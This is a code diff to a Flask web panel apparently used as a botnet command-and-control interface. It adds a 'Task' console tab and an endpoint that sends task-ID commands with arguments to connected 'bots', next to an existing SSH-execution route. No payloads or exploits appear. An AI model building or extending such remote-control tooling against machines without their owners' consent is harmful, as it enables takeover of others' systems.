@@ -332,8 +332,6 @@ def control_ssh_exe():
    resp = server.interface.ssh_exe(cmd)
    return jsonify({'resp': resp if resp else ''})
 
-# -------- AJAX -------- #
-
 def populate_bot_table():
  online_bots = ''
  bots = server.interface.bots
@@ -387,7 +385,8 @@ def fetch_bots():
 def online_bots_source():
  src = '''
   <ul class="sub-tabs">
-   <li onclick="fetchBots()" class="selected"><div>Bots</div></li>
+   <li onclick="onlineBotsSource()" class="selected"><div>Bots</div></li>
+   <li onclick="taskConsoleSource()"><div>Task</div></li>
   </ul> 
   <p id="bots-amount">Bots<span>:</span> <span id="amount"></span></p>
   <p id="server-status">Server<span>:</span> <span class="{}">{}</span></p>
@@ -396,6 +395,32 @@ def online_bots_source():
  '''.format('status-on' if server.is_active else 'status-off', 
             'ON' if server.is_active else 'OFF', session['last_active'])
  return jsonify({'resp': src})
+
+@app.route('/task_console_source', methods=['POST'])
+@login_required
+def task_console_source():
+ src = '''
+  <ul class="sub-tabs">
+   <li onclick="onlineBotsSource()"><div>Bots</div></li>
+   <li onclick="taskConsoleSource()" class="selected"><div>Task</div></li>
+  </ul> 
+  <div id="cmd-line"></div>
+  <input id="console" placeholder="help" spellcheck="false" type="text" size=64>
+  <img src="/static/img/loading.gif" id="console-load">
+  <p id="last_active">last accessed on {}</p>
+ '''.format(session['last_active'])
+ return jsonify({'resp': src})
+
+@app.route('/task_console_cmd', methods=['POST'])
+@login_required
+def task_console_cmd():
+ resp = ''
+ if all(['cmd_id' in request.form, 'args[]' in request.form]):
+  cmd_id = request.form['cmd_id']
+  args = request.form.getlist('args[]')  
+  if all([cmd_id.isdigit(), isinstance(args, list)]):
+   resp = server.interface.execute_cmd_by_task_id(cmd_id, args)
+ return jsonify({'resp': resp})
 
 @app.route('/account_management', methods=['POST'])
 @login_required
@@ -537,7 +562,6 @@ def server_service():
 @app.route('/server_service_source', methods=['POST'])
 @login_required
 def server_service_source():
- # ensure the user views an accurate display
  if all([server.is_active, not session['server_active']]):
   server_start(server.ip, server.port)
 
